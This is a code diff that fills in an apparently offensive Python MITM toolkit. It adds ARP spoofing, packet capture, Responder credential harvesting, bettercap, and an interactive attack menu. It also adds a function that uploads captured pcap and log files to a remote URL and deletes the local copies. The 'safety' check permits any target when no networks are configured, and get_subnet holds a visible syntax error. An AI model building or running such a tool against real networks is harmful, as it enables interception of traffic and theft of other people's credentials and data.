@@ -51,7 +51,7 @@ class MITMTool:
     def load_config(self):
         """Load configuration from file"""
         try:
-            with open(CFIG_FILE) as f:
+            with open(CONFIG_FILE) as f:
                 self.config = json.load(f)
             logger.info("Configuration loaded successfully")
         except (FileNotFoundError, json.JSONDecodeError):
@@ -202,7 +202,228 @@ class MITMTool:
         except Exception as e:
             logger.error(f"Scanning failed: {str(e)}")
 
-    # ... [Rest of the methods remain the same as in the original script]
+    def get_subnet(self, interface):
+        """Calculate subnet from interface IP and netmask"""
+        if interface not in self.interfaces:
+            return None
+            
+        ip = self.interfaces[interface]['ip']
+        netmask = self.interfaces[interface]['netmask']
+        
+        if not ip or not netmask:
+            return None
+            
+        # Simple subnet calculation (for /24 networks)
+        if netmask == "255.255.255.0":
+            return ".".join(ip.split(".")[:3] + ".0/24"
+        return None
+
+    def arp_spoof(self, target_ip, gateway_ip):
+        """Start ARP spoofing between target and gateway"""
+        if not self.check_target_safety(target_ip):
+            logger.error(f"Target {target_ip} is not in allowed networks")
+            return
+            
+        try:
+            # Enable IP forwarding
+            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
+            
+            # Start arpspoof processes
+            cmd1 = ["sudo", "arpspoof", "-i", "mitm-bridge", "-t", target_ip, gateway_ip]
+            cmd2 = ["sudo", "arpspoof", "-i", "mitm-bridge", "-t", gateway_ip, target_ip]
+            
+            self.capture_processes['arpspoof1'] = subprocess.Popen(cmd1)
+            self.capture_processes['arpspoof2'] = subprocess.Popen(cmd2)
+            
+            logger.info(f"ARP spoofing started between {target_ip} and {gateway_ip}")
+            return True
+            
+        except Exception as e:
+            logger.error(f"ARP spoofing failed: {str(e)}")
+            return False
+
+    def check_target_safety(self, target_ip):
+        """Check if target is in allowed networks"""
+        if not self.config.get("allowed_networks"):
+            return True  # No restrictions configured
+            
+        for network in self.config.get("allowed_networks", []):
+            if target_ip.startswith(network):
+                return True
+        return False
+
+    def start_packet_capture(self, interface="mitm-bridge", filename=None):
+        """Start packet capture with tcpdump"""
+        if not filename:
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            filename = f"{DATA_DIR}/capture_{timestamp}.pcap"
+            
+        try:
+            cmd = [
+                "sudo", "tcpdump", "-i", interface, 
+                "-w", filename, "-s", "0", 
+                "not port 22"  # Exclude SSH traffic
+            ]
+            
+            self.capture_processes['tcpdump'] = subprocess.Popen(cmd)
+            logger.info(f"Packet capture started on {interface}, saving to {filename}")
+            return True
+            
+        except Exception as e:
+            logger.error(f"Packet capture failed: {str(e)}")
+            return False
+
+    def start_responder(self, interface="mitm-bridge"):
+        """Start Responder for credential harvesting"""
+        try:
+            cmd = [
+                "sudo", "responder", "-I", interface,
+                "-w", "-d", "--lm"
+            ]
+            
+            self.capture_processes['responder'] = subprocess.Popen(cmd)
+            logger.info(f"Responder started on {interface}")
+            return True
+            
+        except Exception as e:
+            logger.error(f"Failed to start Responder: {str(e)}")
+            return False
+
+    def start_bettercap(self, script_path=None):
+        """Start bettercap with optional script"""
+        try:
+            cmd = ["sudo", "bettercap", "-iface", "mitm-bridge"]
+            
+            if script_path and os.path.exists(script_path):
+                cmd.extend(["-eval", f"load {script_path}"])
+                
+            self.capture_processes['bettercap'] = subprocess.Popen(cmd)
+            logger.info("Bettercap started")
+            return True
+            
+        except Exception as e:
+            logger.error(f"Failed to start bettercap: {str(e)}")
+            return False
+
+    def stop_all_attacks(self):
+        """Stop all running attack processes"""
+        for name, process in self.capture_processes.items():
+            try:
+                process.terminate()
+                process.wait(timeout=5)
+                logger.info(f"Stopped {name}")
+            except:
+                try:
+                    process.kill()
+                    logger.warning(f"Force stopped {name}")
+                except:
+                    logger.error(f"Failed to stop {name}")
+                    
+        self.capture_processes = {}
+        
+        # Disable IP forwarding
+        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], check=False)
+        logger.info("All attacks stopped")
+
+    def upload_data(self):
+        """Upload captured data to remote endpoint"""
+        if not self.config.get("remote_upload", False):
+            logger.info("Remote upload disabled in config")
+            return False
+            
+        try:
+            # Find all capture files
+            files = []
+            for f in os.listdir(DATA_DIR):
+                if f.endswith(".pcap") or f.endswith(".log"):
+                    files.append(os.path.join(DATA_DIR, f))
+                    
+            if not files:
+                logger.info("No capture files to upload")
+                return False
+                
+            # Upload each file
+            for file_path in files:
+                with open(file_path, 'rb') as f:
+                    files = {'file': (os.path.basename(file_path), f)}
+                    response = requests.post(
+                        REMOTE_UPLOAD_URL,
+                        files=files,
+                        headers={'Authorization': f'Bearer {self.config.get("api_key", "")}'}
+                    )
+                    
+                    if response.status_code == 200:
+                        logger.info(f"Successfully uploaded {file_path}")
+                        os.remove(file_path)  # Delete after successful upload
+                    else:
+                        logger.error(f"Upload failed for {file_path}: {response.text}")
+                        
+            return True
+            
+        except Exception as e:
+            logger.error(f"Upload failed: {str(e)}")
+            return False
+
+    def show_main_menu(self):
+        """Display the main menu with ASCII art"""
+        os.system('clear' if os.name == 'posix' else 'cls')
+        print(ASCII_ART)
+        print("\n" + "="*50)
+        print(" MAIN MENU".center(50))
+        print("="*50)
+        print("\n1. Network Scanning Tools")
+        print("2. MITM Attack Tools")
+        print("3. Packet Capture & Analysis")
+        print("4. Credential Harvesting")
+        print("5. System Configuration")
+        print("6. Stop All Attacks")
+        print("7. Exit")
+        
+    def interactive_menu(self):
+        """Main interactive menu"""
+        while True:
+            self.show_main_menu()
+            choice = input("\nSelect an option (1-7): ").strip()
+            
+            try:
+                if choice == "1":
+                    self.network_scan()
+                    input("\nPress Enter to continue...")
+                elif choice == "2":
+                    target = input("Enter target IP: ").strip()
+                    gateway = input("Enter gateway IP: ").strip()
+                    self.arp_spoof(target, gateway)
+                    input("\nPress Enter to continue...")
+                elif choice == "3":
+                    self.start_packet_capture()
+                    input("\nPress Enter to continue...")
+                elif choice == "4":
+                    self.start_responder()
+                    input("\nPress Enter to continue...")
+                elif choice == "5":
+                    print("\nConfiguration options:")
+                    print("1. Toggle remote upload (current: {})".format(
+                        "Enabled" if self.config.get("remote_upload") else "Disabled"))
+                    print("2. Add allowed network")
+                    config_choice = input("Select option: ").strip()
+                    input("\nPress Enter to continue...")
+                elif choice == "6":
+                    self.stop_all_attacks()
+                    input("\nPress Enter to continue...")
+                elif choice == "7":
+                    self.stop_all_attacks()
+                    print("\nGoodbye!")
+                    break
+                else:
+                    print("Invalid choice")
+                    time.sleep(1)
+                    
+            except KeyboardInterrupt:
+                print("\nOperation cancelled")
+                time.sleep(1)
+            except Exception as e:
+                logger.error(f"Error: {str(e)}")
+                time.sleep(2)
 
 if __name__ == "__main__":
     if os.geteuid() != 0:
